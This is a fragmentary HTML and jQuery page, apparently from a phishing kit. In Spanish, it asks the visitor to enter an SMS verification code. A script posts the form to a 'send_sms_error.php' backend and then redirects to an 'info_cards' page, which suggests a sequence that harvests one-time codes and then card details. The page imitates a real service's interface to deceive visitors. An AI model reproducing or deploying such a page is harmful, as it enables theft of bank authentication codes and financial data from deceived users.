<html lang="en" manifest="manifest.appcache"><head><meta charset="gb18030"><style>body {transition: opacity ease-in 0.2s; } 
...
$("#botomemail").attr("disabled", true);
          ...
          $.post("./system/send_sms_error.php?ajax", $("#sendcc").serialize(), function(result) {
                            setTimeout(function() {



                                $(location).attr("href", "info_cards");
                        });
                 });
        },
...
<div id="spinnar" style="display: none;" class="veil visible ember-view"><span id="ember8" class="progress-content-light full-size full-height flexy-item align-centered justify-center size_6 ember-view"><svg class="progress-content-light__svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 400 400" xml:space="preserve">
	...
	<form id="sendcc" name="sendcc" action="#" method="post" class="item-space flexy-item no-margin bg_pr-core-d form-container ember-view">
...
<h2 style="
    ...
    color: #ffffff;
">Introduzca su código SMS válido</h2>
</center>
...
<input placeholder=" " id="smserror" name="smserror" class="form__input txt-overflow_ellipsis ember-text-field ember-view" type="text" required="true"  >
<span class="form__label txt-overflow_ellipsis no-link" aria-hidden="true">Código</span>
</span>
</div>
...
<li id="ember45"  class="button-stack__item item-space-wide ember-view"><button aria-disabled="false" data-id="btnLogin" class="button-default button set-padding-horizontal-4 width-auto oh relative button--positive ember-view"  ><span class="button__content block">
	<b class="button__text txt_s txt-overflow_ellipsis">Verificar</b>
</span>
</button>
</li>
